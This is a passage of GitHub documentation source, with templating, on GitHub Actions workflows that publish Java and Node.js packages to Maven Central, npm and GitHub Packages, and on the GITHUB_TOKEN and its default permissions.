\"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n\n\nAbout package configuration\n\nThe `groupId` and `artifactId` fields in the `MavenPublication` section of the _build.gradle_ file create a unique identifier for your package that registries use to link your package to a registry.  This is similar to the `groupId` and `artifactId` fields of the Maven _pom.xml_ file.  For more information, see the \"Maven Publish Plugin\" in the Gradle documentation.\n\nThe _build.gradle_ file also contains configuration for the distribution management repositories that Gradle will publish packages to. Each repository must have a name, a deployment URL, and credentials for authentication.\n\n\n\nPublishing packages to the Maven Central Repository\n\nEach time you create a new release, you can trigger a workflow to publish your package. The workflow in the example below runs when the `release` event triggers with type `created`. The workflow publishes the package to the Maven Central Repository if CI tests pass. For more information on the `release` event, see \"AUTOTITLE.\"\n\nYou can define a new Maven repository in the publishing block of your _build.gradle_ file that points to your package repository.  For example, if you were deploying to the Maven Central Repository through the OSSRH hosting project, your _build.gradle_ could specify a repository with the name `\"OSSRH\"`.\n\n{% raw %}\n\n```groovy copy\nplugins {\n  ...\n  id 'maven-publish'\n}\n\npublishing {\n  ...\n\n  repositories {\n    maven {\n      name = \"OSSRH\"\n      url = \"https://oss.sonatype.org/service/local/staging/deploy/maven2/\"\n      credentials {\n        username = System.getenv(\"", "Y2h1bmtfMV9pbmRleF8xNzk=": "MAVEN_USERNAME\")\n        password = System.getenv(\"MAVEN_PASSWORD\")\n      }\n    }\n  }\n}\n```\n\n{% endraw %}\n\nWith this configuration, you can create a workflow that publishes your package to the Maven Central Repository by running the `gradle publish` command. In the deploy step, you\u2019ll need to set environment variables for the username and password or token that you use to authenticate to the Maven repository. For more information, see \"AUTOTITLE.\"\n\n```yaml copy\n\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Publish package to the Maven Central Repository\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Set up Java\n        uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Validate Gradle wrapper\n        uses: gradle/wrapper-validation-action@ccb4328a959376b642e027874838f60f8e596de3\n      - name: Publish package\n        uses: gradle/gradle-build-action@749f47bda3e44aa060e82d7b3ef7e40d953bd629\n        with:\n          arguments: publish\n        env:\n          MAVEN_USERNAME: {% raw %}${{ secrets.OSSRH_USERNAME }}{% endraw %}\n          MAVEN_PASSWORD: {% raw %}${{ secrets.OSSRH_TOKEN }}{% endraw %}\n```\n\n{% data reusables.actions.gradle-workflow-steps %}\n1. Runs the `gradle/gradle-build-action` action with the `publish` argument to publish to the `OSSRH` Maven repository. The `MAVEN_USERNAME` environment variable will be set with the contents of your `OSSRH_USERNAME` secret, and the `MAVEN_PASSWORD` environment variable will be set with the contents of your `OSSRH_TOKEN` secret.\n\n   For more information about using secrets in your workflow, see \"AUTOTITLE.\"\n\n\n\nPublishing packages to {% data variables.product.prodname_registry %}\n\nEach time you create a new release, you can trigger a workflow to publish your package. The wor", "Y2h1bmtfMl9pbmRleF8xNzk=": "kflow in the example below runs when the `release` event triggers with type `created`. The workflow publishes the package to {% data variables.product.prodname_registry %} if CI tests pass. For more information on the `release` event, see \"AUTOTITLE.\"\n\nYou can define a new Maven repository in the publishing block of your _build.gradle_ that points to {% data variables.product.prodname_registry %}.  In that repository configuration, you can also take advantage of environment variables set in your CI workflow run.  You can use the `GITHUB_ACTOR` environment variable as a username, and you can set the `GITHUB_TOKEN` environment variable with your `GITHUB_TOKEN` secret.\n\n{% data reusables.actions.github-token-permissions %}\n\nFor example, if your organization is named \"octocat\" and your repository is named \"hello-world\", then the {% data variables.product.prodname_registry %} configuration in _build.gradle_ would look similar to the below example.\n\n{% raw %}\n\n```groovy copy\nplugins {\n  ...\n  id 'maven-publish'\n}\n\npublishing {\n  ...\n\n  repositories {\n    maven {\n      name = \"GitHubPackages\"\n      url = \"https://maven.pkg.github.com/octocat/hello-world\"\n      credentials {\n        username = System.getenv(\"GITHUB_ACTOR\")\n        password = System.getenv(\"GITHUB_TOKEN\")\n      }\n    }\n  }\n}\n```\n\n{% endraw %}\n\nWith this configuration, you can create a workflow that publishes your package to {% data variables.product.prodname_registry %} by running the `gradle publish` command.\n\n```yaml copy\n\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Publish package to GitHub Packages\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Valid", "Y2h1bmtfM19pbmRleF8xNzk=": "ate Gradle wrapper\n        uses: gradle/wrapper-validation-action@ccb4328a959376b642e027874838f60f8e596de3\n      - name: Publish package\n        uses: gradle/gradle-build-action@749f47bda3e44aa060e82d7b3ef7e40d953bd629\n        with:\n          arguments: publish\n        env:\n          GITHUB_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n{% data reusables.actions.gradle-workflow-steps %}\n1. Runs the `gradle/gradle-build-action` action with the `publish` argument to publish to {% data variables.product.prodname_registry %}. The `GITHUB_TOKEN` environment variable will be set with the content of the `GITHUB_TOKEN` secret. The `permissions` key specifies the access that the `GITHUB_TOKEN` secret will allow.\n\n   For more information about using secrets in your workflow, see \"AUTOTITLE.\"\n\n\n\nPublishing packages to the Maven Central Repository and {% data variables.product.prodname_registry %}\n\nYou can publish your packages to both the Maven Central Repository and {% data variables.product.prodname_registry %} by configuring each in your _build.gradle_ file.\n\nEnsure your _build.gradle_ file includes a repository for both your {% data variables.product.prodname_dotcom %} repository and your Maven Central Repository provider.\n\nFor example, if you deploy to the Central Repository through the OSSRH hosting project, you might want to specify it in a distribution management repository with the `name` set to `OSSRH`. If you deploy to {% data variables.product.prodname_registry %}, you might want to specify it in a distribution management repository with the `name` set to `GitHubPackages`.\n\nIf your organization is named \"octocat\" and your repository is named \"hello-world\", then the configuration in _build.gradle_ would look similar to the below example.\n\n{% raw %}\n\n```groovy copy\nplugins {\n  ...\n  id 'maven-publish'\n}\n\npublishing {\n  ...\n\n  repositories {\n    maven {\n      name = \"OSSRH\"\n      url = \"https://oss.sonatype.org/service/local/staging/deploy/maven2/\"\n      credentials {\n        username = System.getenv(", "Y2h1bmtfNF9pbmRleF8xNzk=": "\"MAVEN_USERNAME\")\n        password = System.getenv(\"MAVEN_PASSWORD\")\n      }\n    }\n    maven {\n      name = \"GitHubPackages\"\n      url = \"https://maven.pkg.github.com/octocat/hello-world\"\n      credentials {\n        username = System.getenv(\"GITHUB_ACTOR\")\n        password = System.getenv(\"GITHUB_TOKEN\")\n      }\n    }\n  }\n}\n```\n\n{% endraw %}\n\nWith this configuration, you can create a workflow that publishes your package to both the Maven Central Repository and {% data variables.product.prodname_registry %} by running the `gradle publish` command.\n\n```yaml copy\n\n{% data reusables.actions.actions-not-certified-by-github-comment %}\n\n{% data reusables.actions.actions-use-sha-pinning-comment %}\n\nname: Publish package to the Maven Central Repository and GitHub Packages\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Set up Java\n        uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Validate Gradle wrapper\n        uses: gradle/wrapper-validation-action@ccb4328a959376b642e027874838f60f8e596de3\n      - name: Publish package\n        uses: gradle/gradle-build-action@749f47bda3e44aa060e82d7b3ef7e40d953bd629\n        with:\n          arguments: publish\n        env: {% raw %}\n          MAVEN_USERNAME: ${{ secrets.OSSRH_USERNAME }}\n          MAVEN_PASSWORD: ${{ secrets.OSSRH_TOKEN }}\n          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\n{% data reusables.actions.gradle-workflow-steps %}\n1. Runs the `gradle/gradle-build-action` action with the `publish` argument to publish to the `OSSRH` Maven repository and {% data variables.product.prodname_registry %}. The `MAVEN_USERNAME` environment variable will be set with the contents of your `OSSRH_USERNAME` secret, and the `MAVEN_PASSWORD` environment variable will be set with the contents of your `OSSRH_", "Y2h1bmtfNV9pbmRleF8xNzk=": "TOKEN` secret. The `GITHUB_TOKEN` environment variable will be set with the content of the `GITHUB_TOKEN` secret. The `permissions` key specifies the access that the `GITHUB_TOKEN` secret will allow.\n\n   For more information about using secrets in your workflow, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xODA=": "\n\nIntroduction\n\n{% data reusables.actions.publishing-java-packages-intro %}\n\n\n\nPrerequisites\n\nWe recommend that you have a basic understanding of workflow files and configuration options. For more information, see \"AUTOTITLE.\"\n\nFor more information about creating a CI workflow for your Java project with Maven, see \"AUTOTITLE.\"\n\nYou may also find it helpful to have a basic understanding of the following:\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n\n\nAbout package configuration\n\nThe `groupId` and `artifactId` fields in the _pom.xml_ file create a unique identifier for your package that registries use to link your package to a registry.  For more information see Guide to uploading artifacts to the Central Repository in the Apache Maven documentation.\n\nThe _pom.xml_ file also contains configuration for the distribution management repositories that Maven will deploy packages to. Each repository must have a name and a deployment URL. Authentication for these repositories can be configured in the _.m2/settings.xml_ file in the home directory of the user running Maven.\n\nYou can use the `setup-java` action to configure the deployment repository as well as authentication for that repository. For more information, see `setup-java`.\n\n\n\nPublishing packages to the Maven Central Repository\n\nEach time you create a new release, you can trigger a workflow to publish your package. The workflow in the example below runs when the `release` event triggers with type `created`. The workflow publishes the package to the Maven Central Repository if CI tests pass. For more information on the `release` event, see \"AUTOTITLE.\"\n\nIn this workflow, you can use the `setup-java` action. This action installs the given version of the JDK into the `PATH`, but it also configures a Maven _settings.xml_ for publishing packages. By default, the settings file will be configured for {% data variables.product.prodname_registry %}, but it can be configured to deploy to another package registry, such as the Maven Central Repository. If you alre", "Y2h1bmtfMV9pbmRleF8xODA=": "ady have a distribution management repository configured in _pom.xml_, then you can specify that `id` during the `setup-java` action invocation.\n\nFor example, if you were deploying to the Maven Central Repository through the OSSRH hosting project, your _pom.xml_ could specify a distribution management repository with the `id` of `ossrh`.\n\n{% raw %}\n\n```xml copy\n\n  ...\n  \n    \n      ossrh\n      Central Repository OSSRH\n      https://oss.sonatype.org/service/local/staging/deploy/maven2/\n    \n  \n\n```\n\n{% endraw %}\n\nWith this configuration, you can create a workflow that publishes your package to the Maven Central Repository by specifying the repository management `id` to the `setup-java` action. You\u2019ll also need to provide environment variables that contain the username and password to authenticate to the repository.\n\nIn the deploy step, you\u2019ll need to set the environment variables to the username that you authenticate with to the repository, and to a secret that you\u2019ve configured with the password or token to authenticate with.  For more information, see \"AUTOTITLE.\"\n\n```yaml copy\nname: Publish package to the Maven Central Repository\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - name: Set up Maven Central Repository\n        uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n          server-id: ossrh\n          server-username: MAVEN_USERNAME\n          server-password: MAVEN_PASSWORD\n      - name: Publish package\n        run: mvn --batch-mode deploy\n        env:\n          MAVEN_USERNAME: {% raw %}${{ secrets.OSSRH_USERNAME }}{% endraw %}\n          MAVEN_PASSWORD: {% raw %}${{ secrets.OSSRH_TOKEN }}{% endraw %}\n```\n\nThis workflow performs the following steps:\n\n1. Checks out a copy of project's repository.\n1. Sets up the Java JDK, and also configures the Maven _settings.xml_ file to add authentication for the `ossrh` repository us", "Y2h1bmtfMl9pbmRleF8xODA=": "ing the `MAVEN_USERNAME` and `MAVEN_PASSWORD` environment variables.\n1. {% data reusables.actions.publish-to-maven-workflow-step %}\n\n   For more information about using secrets in your workflow, see \"AUTOTITLE.\"\n\n\n\nPublishing packages to {% data variables.product.prodname_registry %}\n\nEach time you create a new release, you can trigger a workflow to publish your package. The workflow in the example below runs when the `release` event triggers with type `created`. The workflow publishes the package to {% data variables.product.prodname_registry %} if CI tests pass. For more information on the `release` event, see \"AUTOTITLE.\"\n\nIn this workflow, you can use the `setup-java` action. This action installs the given version of the JDK into the `PATH`, and also sets up a Maven _settings.xml_ for publishing the package to {% data variables.product.prodname_registry %}. The generated _settings.xml_ defines authentication for a server with an `id` of `github`, using the `GITHUB_ACTOR` environment variable as the username and the `GITHUB_TOKEN` environment variable as the password. The `GITHUB_TOKEN` environment variable is assigned the value of the special `GITHUB_TOKEN` secret.\n\n{% data reusables.actions.github-token-permissions %}\n\nFor a Maven-based project, you can make use of these settings by creating a distribution repository in your _pom.xml_ file with an `id` of `github` that points to your {% data variables.product.prodname_registry %} endpoint.\n\nFor example, if your organization is named \"octocat\" and your repository is named \"hello-world\", then the {% data variables.product.prodname_registry %} configuration in _pom.xml_ would look similar to the below example.\n\n{% raw %}\n\n```xml copy\n\n  ...\n  \n    \n      github\n      GitHub Packages\n      https://maven.pkg.github.com/octocat/hello-world\n    \n  \n\n```\n\n{% endraw %}\n\nWith this configuration, you can create a workflow that publishes your package to {% data variables.product.prodname_registry %} by making use of the automatically generated _settings.xml_.\n\n```yaml c", "Y2h1bmtfM19pbmRleF8xODA=": "opy\nname: Publish package to GitHub Packages\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      - uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Publish package\n        run: mvn --batch-mode deploy\n        env:\n          GITHUB_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\nThis workflow performs the following steps:\n\n1. Checks out a copy of project's repository.\n1. Sets up the Java JDK, and also automatically configures the Maven _settings.xml_ file to add authentication for the `github` Maven repository to use the `GITHUB_TOKEN` environment variable.\n1. {% data reusables.actions.publish-to-packages-workflow-step %}\n\n   For more information about using secrets in your workflow, see \"AUTOTITLE.\"\n\n\n\nPublishing packages to the Maven Central Repository and {% data variables.product.prodname_registry %}\n\nYou can publish your packages to both the Maven Central Repository and {% data variables.product.prodname_registry %} by using the `setup-java` action for each registry.\n\nEnsure your _pom.xml_ file includes a distribution management repository for both your {% data variables.product.prodname_dotcom %} repository and your Maven Central Repository provider. For example, if you deploy to the Central Repository through the OSSRH hosting project, you might want to specify it in a distribution management repository with the `id` set to `ossrh`, and you might want to specify {% data variables.product.prodname_registry %} in a distribution management repository with the `id` set to `github`.\n\n```yaml copy\nname: Publish package to the Maven Central Repository and GitHub Packages\non:\n  release:\n    types: [created]\njobs:\n  publish:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: {% data reusab", "Y2h1bmtfNF9pbmRleF8xODA=": "les.actions.action-checkout %}\n      - name: Set up Java for publishing to Maven Central Repository\n        uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n          server-id: ossrh\n          server-username: MAVEN_USERNAME\n          server-password: MAVEN_PASSWORD\n      - name: Publish to the Maven Central Repository\n        run: mvn --batch-mode deploy\n        env:\n          MAVEN_USERNAME: {% raw %}${{ secrets.OSSRH_USERNAME }}{% endraw %}\n          MAVEN_PASSWORD: {% raw %}${{ secrets.OSSRH_TOKEN }}{% endraw %}\n      - name: Set up Java for publishing to GitHub Packages\n        uses: {% data reusables.actions.action-setup-java %}\n        with:\n          java-version: '11'\n          distribution: 'temurin'\n      - name: Publish to GitHub Packages\n        run: mvn --batch-mode deploy\n        env:\n          GITHUB_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\nThis workflow calls the `setup-java` action twice.  Each time the `setup-java` action runs, it overwrites the Maven _settings.xml_ file for publishing packages.  For authentication to the repository, the _settings.xml_ file references the distribution management repository `id`, and the username and password.\n\nThis workflow performs the following steps:\n\n1. Checks out a copy of project's repository.\n1. Calls `setup-java` the first time. This configures the Maven _settings.xml_ file for the `ossrh` repository, and sets the authentication options to environment variables that are defined in the next step.\n1. {% data reusables.actions.publish-to-maven-workflow-step %}\n1. Calls `setup-java` the second time. This automatically configures the Maven _settings.xml_ file for {% data variables.product.prodname_registry %}.\n1. {% data reusables.actions.publish-to-packages-workflow-step %}\n\n   For more information about using secrets in your workflow, see \"AUTOTITLE.\"\n\n", "Y2h1bmtfMF9pbmRleF8xODE=": "\n\nIntroduction\n\nThis guide shows you how to create a workflow that publishes Node.js packages to the {% data variables.product.prodname_registry %} and npm registries after continuous integration (CI) tests pass.\n\n\n\nPrerequisites\n\nWe recommend that you have a basic understanding of workflow configuration options and how to create a workflow file. For more information, see \"AUTOTITLE.\"\n\nFor more information about creating a CI workflow for your Node.js project, see \"AUTOTITLE.\"\n\nYou may also find it helpful to have a basic understanding of the following:\n\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n- \"AUTOTITLE\"\n\n\n\nAbout package configuration\n\n The `name` and `version` fields in the `package.json` file create a unique identifier that registries use to link your package to a registry. You can add a summary for the package listing page by including a `description` field in the `package.json` file. For more information, see \"Creating a package.json file\" and \"Creating Node.js modules\" in the npm documentation.\n\nWhen a local `.npmrc` file exists and has a `registry` value specified, the `npm publish` command uses the registry configured in the `.npmrc` file. {% data reusables.actions.setup-node-intro %}\n\nYou can specify the Node.js version installed on the runner using the `setup-node` action.\n\nIf you add steps in your workflow to configure the `publishConfig` fields in your `package.json` file, you don't need to specify the registry-url using the `setup-node` action, but you will be limited to publishing the package to one registry. For more information, see \"publishConfig\" in the npm documentation.\n\n\n\nPublishing packages to the npm registry\n\nYou can trigger a workflow to publish your package every time you publish a new release. The process in the following example is executed when the release event of type `published` is triggered. If the CI tests pass, the process uploads the package to the npm registry. For more information, see \"AUTOTITLE.\"\n\nTo perform authenticated operations against the npm registry in your work", "Y2h1bmtfMV9pbmRleF8xODE=": "flow, you'll need to store your npm authentication token as a secret. For example, create a repository secret called `NPM_TOKEN`. For more information, see \"AUTOTITLE.\"\n\nBy default, npm uses the `name` field of the `package.json` file to determine the name of your published package. When publishing to a global namespace, you only need to include the package name. For example, you would publish a package named `my-package` to `https://www.npmjs.com/package/my-package`.\n\nIf you're publishing a package that includes a scope prefix, include the scope in the name of your `package.json` file. For example, if your npm scope prefix is \"octocat\" and the package name is \"hello-world\", the `name` in your `package.json` file should be `@octocat/hello-world`. If your npm package uses a scope prefix and the package is public, you need to use the option `npm publish --access public`. This is an option that npm requires to prevent someone from publishing a private package unintentionally.\n\nThis example stores the `NPM_TOKEN` secret in the `NODE_AUTH_TOKEN` environment variable. When the `setup-node` action creates an `.npmrc` file, it references the token from the `NODE_AUTH_TOKEN` environment variable.\n\n```yaml copy\nname: Publish Package to npmjs\non:\n  release:\n    types: [published]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      # Setup .npmrc file to publish to npm\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '20.x'\n          registry-url: 'https://registry.npmjs.org'\n      - run: npm ci\n      - run: npm publish\n        env:\n          NODE_AUTH_TOKEN: {% raw %}${{ secrets.NPM_TOKEN }}{% endraw %}\n```\n\nIn the example above, the `setup-node` action creates an `.npmrc` file on the runner with the following contents:\n\n```shell\n//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}\nregistry=https://registry.npmjs.org/\nalways-auth=true\n```\n\nPlease note that you need to set the `registry-url` to `https://registry", "Y2h1bmtfMl9pbmRleF8xODE=": ".npmjs.org/` in `setup-node` to properly configure your credentials.\n\n\n\nPublishing packages to {% data variables.product.prodname_registry %}\n\nYou can trigger a workflow to publish your package every time you publish a new release. The process in the following example is executed when the release event of type `published` is triggered. If the CI tests pass, the process uploads the package to {% data variables.product.prodname_registry %}. For more information, see \"AUTOTITLE.\"\n\n\n\nConfiguring the destination repository\n\nLinking your package to {% data variables.product.prodname_registry %} using the `repository` key is optional. If you choose not to provide the `repository` key in your `package.json` file, then {% ifversion packages-npm-v2 %}your package will not be linked to a repository when it is published, but you can choose to connect the package to a repository later.{% else %}{% data variables.product.prodname_registry %} publishes a package in the {% data variables.product.prodname_dotcom %} repository you specify in the `name` field of the `package.json` file. For example, a package named `@my-org/test` is published to the `my-org/test` {% data variables.product.prodname_dotcom %} repository. If the `url` specified in the `repository` key is invalid, your package may still be published however it won't be linked to the repository source as intended.{% endif %}\n\nIf you do provide the `repository` key in your `package.json` file, then the repository in that key is used as the destination npm registry for {% data variables.product.prodname_registry %}. For example, publishing the below `package.json` results in a package named `my-package` published to the `octocat/my-other-repo` {% data variables.product.prodname_dotcom %} repository.{% ifversion packages-npm-v2 %}{% else %} Once published, only the repository source is updated, and the package doesn't inherit any permissions from the destination repository.{% endif %}\n\n```json\n{\n  \"name\": \"@octocat/my-package\",\n  \"repository\": {\n    \"type\": \"git\",\n    \"url", "Y2h1bmtfM19pbmRleF8xODE=": "\": \"https://github.com/octocat/my-other-repo.git\"\n  },\n```\n\n\n\nAuthenticating to the destination repository\n\nTo perform authenticated operations against the {% data variables.product.prodname_registry %} registry in your workflow, you can use the `GITHUB_TOKEN`. {% data reusables.actions.github-token-permissions %}\n\nIf you want to publish your package to a different repository, you must use a {% data variables.product.pat_v1 %} that has permission to write to packages in the destination repository. For more information, see \"AUTOTITLE\" and \"AUTOTITLE.\"\n\n\n\nExample workflow\n\nThis example stores the `GITHUB_TOKEN` secret in the `NODE_AUTH_TOKEN` environment variable. When the `setup-node` action creates an `.npmrc` file, it references the token from the `NODE_AUTH_TOKEN` environment variable.\n\n```yaml copy\nname: Publish package to GitHub Packages\non:\n  release:\n    types: [published]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      packages: write\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      # Setup .npmrc file to publish to GitHub Packages\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '20.x'\n          registry-url: 'https://npm.pkg.github.com'\n          # Defaults to the user or organization that owns the workflow file\n          scope: '@octocat'\n      - run: npm ci\n      - run: npm publish\n        env:\n          NODE_AUTH_TOKEN: {% raw %}${{ secrets.GITHUB_TOKEN }}{% endraw %}\n```\n\nThe `setup-node` action creates an `.npmrc` file on the runner. When you use the `scope` input to the `setup-node` action, the `.npmrc` file includes the scope prefix. By default, the `setup-node` action sets the scope in the `.npmrc` file to the account that contains that workflow file.\n\n```shell\n//npm.pkg.github.com/:_authToken=${NODE_AUTH_TOKEN}\n@octocat:registry=https://npm.pkg.github.com\nalways-auth=true\n```\n\n\n\nPublishing packages using yarn\n\nIf you use the Yarn package manager, you can install and publish package", "Y2h1bmtfNF9pbmRleF8xODE=": "s using Yarn.\n\n```yaml copy\nname: Publish Package to npmjs\non:\n  release:\n    types: [published]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - uses: {% data reusables.actions.action-checkout %}\n      # Setup .npmrc file to publish to npm\n      - uses: {% data reusables.actions.action-setup-node %}\n        with:\n          node-version: '20.x'\n          registry-url: 'https://registry.npmjs.org'\n          # Defaults to the user or organization that owns the workflow file\n          scope: '@octocat'\n      - run: yarn\n      - run: yarn npm publish // for Yarn version 1, use `yarn publish` instead\n        env:\n          NODE_AUTH_TOKEN: {% raw %}${{ secrets.NPM_TOKEN }}{% endraw %}\n```\n\n", "Y2h1bmtfMF9pbmRleF8xODI=": "\n\nAbout the `GITHUB_TOKEN` secret\n\nAt the start of each workflow job, {% data variables.product.prodname_dotcom %} automatically creates a unique `GITHUB_TOKEN` secret to use in your workflow. You can use the `GITHUB_TOKEN` to authenticate in the workflow job.\n\nWhen you enable {% data variables.product.prodname_actions %}, {% data variables.product.prodname_dotcom %} installs a {% data variables.product.prodname_github_app %} on your repository. The `GITHUB_TOKEN` secret is a {% data variables.product.prodname_github_app %} installation access token. You can use the installation access token to authenticate on behalf of the {% data variables.product.prodname_github_app %} installed on your repository. The token's permissions are limited to the repository that contains your workflow. For more information, see \"Permissions for the `GITHUB_TOKEN`.\"\n\nBefore each job begins, {% data variables.product.prodname_dotcom %} fetches an installation access token for the job. {% data reusables.actions.github-token-expiration %}\n\nThe token is also available in the `github.token` context. For more information, see \"AUTOTITLE.\"\n\n\n\nUsing the `GITHUB_TOKEN` in a workflow\n\nYou can use the `GITHUB_TOKEN` by using the standard syntax for referencing secrets: {%raw%}`${{ secrets.GITHUB_TOKEN }}`{% endraw %}. Examples of using the `GITHUB_TOKEN` include passing the token as an input to an action, or using it to make an authenticated {% ifversion fpt or ghec %}{% data variables.product.prodname_dotcom %}{% else %}{% data variables.product.product_name %}{% endif %} API request.\n\n{% note %}\n\n**Important:** An action can access the `GITHUB_TOKEN` through the `github.token` context even if the workflow does not explicitly pass the `GITHUB_TOKEN` to the action. As a good security practice, you should always make sure that actions only have the minimum access they require by limiting the permissions granted to the `GITHUB_TOKEN`. For more information, see \"Permissions for the `GITHUB_TOKEN`.\"\n\n{% endnote %}\n\n{% data reusables.actions.actions", "Y2h1bmtfMV9pbmRleF8xODI=": "-do-not-trigger-workflows %}\n\n{% data reusables.actions.actions-do-not-trigger-pages-rebuilds %}\n\n\n\nExample 1: passing the `GITHUB_TOKEN` as an input\n\n{% data reusables.actions.github_token-input-example %}\n\n\n\nExample 2: calling the REST API\n\nYou can use the `GITHUB_TOKEN` to make authenticated API calls. This example workflow creates an issue using the {% data variables.product.prodname_dotcom %} REST API:\n\n```yaml\nname: Create issue on commit\n\non: [ push ]\n\njobs:\n  create_issue:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n    steps:\n      - name: Create issue using REST API\n        run: |\n          curl --request POST \\\n          --url {% data variables.product.api_url_code %}/repos/${% raw %}{{ github.repository }}{% endraw %}/issues \\\n          --header 'authorization: Bearer ${% raw %}{{ secrets.GITHUB_TOKEN }}{% endraw %}' \\\n          --header 'content-type: application/json' \\\n          --data '{\n            \"title\": \"Automated issue for commit: ${% raw %}{{ github.sha }}{% endraw %}\",\n            \"body\": \"This issue was automatically created by the GitHub Action workflow **${% raw %}{{ github.workflow }}{% endraw %}**. \\n\\n The commit hash was: _${% raw %}{{ github.sha }}{% endraw %}_.\"\n            }' \\\n          --fail\n```\n\n\n\nPermissions for the `GITHUB_TOKEN`\n\nFor information about the API endpoints {% data variables.product.prodname_github_apps %} can access with each permission, see \"AUTOTITLE.\"\n\nThe following table shows the permissions granted to the `GITHUB_TOKEN` by default. People with admin permissions to an {% ifversion not ghes %}enterprise, organization, or repository,{% else %}organization or repository{% endif %} can set the default permissions to be either permissive or restricted. For information on how to set the default permissions for the `GITHUB_TOKEN` for your enterprise, organization, or repository, see \"AUTOTITLE,\" \"AUTOTITLE,\" or \"AUTOTITLE.\"\n\n{% rowheaders %}\n\n| Scope         | Default access(permissive) | Default access(restricted) | Maximum access forpull re", "Y2h1bmtfMl9pbmRleF8xODI=": "quests frompublic forked repositories |\n|---------------|-----------------------------|-----------------------------|--------------------------------|\n| actions       | read/write  | none | read |\n| checks        | read/write  | none | read |\n| contents      | read/write  | read | read |\n| deployments   | read/write  | none | read |{% ifversion fpt or ghec %}\n| id-token      | none        | none | read |{% endif %}\n| issues        | read/write  | none | read |\n| metadata      | read        | read | read |\n| packages      | read/write  | {% ifversion actions-default-workflow-permissions-restrictive %}read{% else %}none{% endif %} | read |\n| pages         | read/write  | none | read |\n| pull-requests | read/write  | none | read |\n| repository-projects | read/write | none | read |\n| security-events     | read/write | none | read |\n| statuses      | read/write  | none | read |\n\n{% endrowheaders %}\n\n{% note %}\n\n**Notes:**\n- When a workflow is triggered by the `pull_request_target` event, the `GITHUB_TOKEN` is granted read/write repository permission, even when it is triggered from a public fork. For more information, see \"AUTOTITLE.\"\n- Private repositories can control whether pull requests from forks can run workflows, and can configure the permissions assigned to `GITHUB_TOKEN`. For more information, see \"AUTOTITLE.\"\n- {% data reusables.actions.workflow-runs-dependabot-note %}\n\n{% endnote %}\n\n\n\nModifying the permissions for the `GITHUB_TOKEN`\n\nYou can modify the permissions for the `GITHUB_TOKEN` in individual workflow files. If the default permissions for the `GITHUB_TOKEN` are restrictive, you may have to elevate the permissions to allow some actions and commands to run successfully. If the default permissions are permissive, you can edit the workflow file to remove some permissions from the `GITHUB_TOKEN`. As a good security practice, you should grant the `GITHUB_TOKEN` the least required access.\n\nYou can see the permissions that `GITHUB_TOKEN` had for a specific job in the \"Set up job\" section of the workflow run", "Y2h1bmtfM19pbmRleF8xODI=": " log. For more information, see \"AUTOTITLE.\"\n\nYou can use the `permissions` key in your workflow file to modify permissions for the `GITHUB_TOKEN` for an entire workflow or for individual jobs. This allows you to configure the minimum required permissions for a workflow or job. When the `permissions` key is used, all unspecified permissions are set to no access, with the exception of the `metadata` scope, which always gets read access.\n\n{% data reusables.actions.forked-write-permission %}\n\nThe two workflow examples earlier in this article show the `permissions` key being used at the job level, as it is best practice to limit the permissions' scope.\n\nFor full details of the `permissions` key, see \"AUTOTITLE.\"\n\n{% note %}\n\n**Note:** Organization{% ifversion not fpt %} and enterprise{% endif %} owners can prevent you from granting write access to the `GITHUB_TOKEN` at the repository level. For more information, see \"AUTOTITLE{% ifversion not fpt %} and \"AUTOTITLE.\"{% else %}.\"{% endif %}\n\n{% endnote %}\n\n\n\nHow the permissions are calculated for a workflow job\n\nThe permissions for the 